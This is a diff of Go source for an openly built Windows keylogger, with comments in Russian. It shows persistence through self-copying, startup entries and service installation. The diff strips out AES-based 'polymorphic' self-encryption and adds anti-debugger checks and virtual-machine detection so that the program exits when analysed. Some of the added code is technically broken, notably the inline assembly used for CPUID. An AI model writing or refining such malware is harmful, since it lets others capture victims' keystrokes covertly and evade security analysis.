@@ -2,12 +2,8 @@ package main
 
 import (
 	"bufio"
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
 	"encoding/base64"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"log"
 	"os"
@@ -27,62 +23,12 @@ import (
 const (
 	serviceName = "BackgroundService"
 	logFileName = "hidden.log"
-	// Ключ шифрования (заменить на свой сгенерированный ключ)
-	encryptionKey = "12345678901234567890123456789012" // 32-байтный ключ AES-256
 )
 
-// Шифрование данных с помощью AES-256
-func encrypt(data []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
-		return nil, err
-	}
-
-	ciphertext := gcm.Seal(nonce, nonce, data, nil)
-	return ciphertext, nil
-}
-
-// Дешифрование данных с помощью AES-256
-func decrypt(data []byte, key []byte) ([]byte, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	nonceSize := gcm.NonceSize()
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return nil, err
-	}
-
-	return plaintext, nil
-}
-
-// Полиморфная функция для изменения кода программы (теперь с шифрованием)
-func polymorphicTransform(code []byte) ([]byte, error) {
-	encryptedCode, err := encrypt(code, []byte(encryptionKey))
-	if err != nil {
-		return nil, err
-	}
-	encoded := base64.StdEncoding.EncodeToString(encryptedCode)
-	return []byte(encoded), nil
+// Полиморфная функция для изменения кода программы
+func polymorphicTransform(code []byte) []byte {
+	encoded := base64.StdEncoding.EncodeToString(code)
+	return []byte(encoded)
 }
 
 // Функция для создания копии программы
@@ -105,11 +51,7 @@ func selfCopy() {
 		return
 	}
 
-	transformedData, err := polymorphicTransform(data)
-	if err != nil {
-		log.Println("Ошибка полиморфного преобразования:", err)
-		return
-	}
+	transformedData := polymorphicTransform(data)
 
 	decodedData, err := base64.StdEncoding.DecodeString(string(transformedData))
 	if err != nil {
@@ -293,47 +235,95 @@ func removeSelfCopy() {
 	}
 	log.Println("Удалено:", newExePath)
 }
+
+// Проверка на наличие отладчика
+func isDebuggerPresent() bool {
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
+	ret, _, _ := isDebuggerPresent.Call()
+	return ret != 0
+}
+
+// Проверка на наличие удаленного отладчика
+func checkRemoteDebuggerPresent() bool {
+	var isRemoteDebuggerPresent uintptr
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	checkRemoteDebuggerPresent := kernel32.NewProc("CheckRemoteDebuggerPresent")
+	ret, _, _ := checkRemoteDebuggerPresent.Call(uintptr(windows.CurrentProcess()), uintptr(unsafe.Pointer(&isRemoteDebuggerPresent)))
+	return ret != 0 && isRemoteDebuggerPresent != 0
+}
+
+// Проверка на виртуальную машину по vendor ID
+func isRunningInVM() bool {
+	cpuInfo := [4]uint32{}
+	cpuid := func(op uint32, info *[4]uint32) {
+		asm := `
+            mov eax, [rcx]
+            xor ecx, ecx
+            cpuid
+            mov [rdi], eax
+            mov [rdi+4], ebx
+            mov [rdi+8], edx
+            mov [rdi+12], ecx
+        `
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		ret, _, _ := windows.Syscall(windows.GetProcAddress(windows.GetModuleHandle(syscall.StringToUTF16Ptr("kernel32.dll")), "VirtualProtect"), 4, uintptr(unsafe.Pointer(&asm)), 0x1000, 0x40, uintptr(unsafe.Pointer(&cpuInfo[0])))
+		if ret == 0 {
+			panic("VirtualProtect failed")
+		}
+		syscall.Syscall(uintptr(unsafe.Pointer(&asm)), 2, uintptr(op), 0, uintptr(unsafe.Pointer(&info[0])))
+	}
+	cpuid(0, &cpuInfo)
+	vendor := [13]byte{}
+	for i := 0; i < 4; i++ {
+		vendor[i] = byte(cpuInfo[1] >> (8 * i) & 0xff)
+	}
+	for i := 0; i < 4; i++ {
+		vendor[i+4] = byte(cpuInfo[3] >> (8 * i) & 0xff)
+	}
+	for i := 0; i < 4; i++ {
+		vendor[i+8] = byte(cpuInfo[2] >> (8 * i) & 0xff)
+	}
+	vendor[12] = 0x00
+
+	vendorID := string(vendor[:])
+
+	// Проверяем, не является ли ID характерным для виртуальной машины
+	vmVendors := []string{"VBoxVBoxVBox", "VMwareVMware", "Microsoft Hv", "KVMKVMKVM"}
+	for _, v := range vmVendors {
+		if v == vendorID {
+			return true
+		}
+	}
+	return false
+}
+
 // Основная функция
 func main() {
 	runtime.LockOSThread()
-    time.Sleep(time.Duration(rand.Intn(5000)) * time.Millisecond)
-	// Проверяем, запущена ли уже другая копия
-	if !checkDuplicate() {
-        
-		selfCopy()
-		addToStartup()
-		installService()
-        
-        
-        exePath, err := os.Executable()
-        if err != nil {
-            log.Println("Ошибка получения пути исполняемого файла:", err)
-            return
-        }
-    
-        data, err := ioutil.ReadFile(exePath)
-        if err != nil {
-            log.Println("Ошибка чтения исполняемого файла:", err)
-            return
-        }
-    
-        decryptedData, err := decrypt(data, []byte(encryptionKey))
-        if err != nil {
-            log.Println("Ошибка дешифрования:", err)
-            return
-        }
 
-    	err = ioutil.WriteFile(exePath, decryptedData, 0755)
-    	if err != nil {
-    		log.Println("Ошибка записи нового файла:", err)
-    		return
-    	}
-        
-        
-		keylogger()
-	} else {
+	// Проверяем, запущена ли уже другая копия
+	if checkDuplicate() {
 		log.Println("Другая копия уже запущена")
 		os.Exit(0)
 	}
-    removeSelfCopy()
+
+	// Проверка на наличие отладчика
+	if isDebuggerPresent() || checkRemoteDebuggerPresent() {
+		log.Println("Отладчик обнаружен")
+		os.Exit(1)
+	}
+
+	// Проверка на виртуальную машину
+	if isRunningInVM() {
+		log.Println("Виртуальная машина обнаружена")
+		os.Exit(1)
+	}
+
+	selfCopy()
+	addToStartup()
+	installService()
+	keylogger()
+	removeSelfCopy()
 }
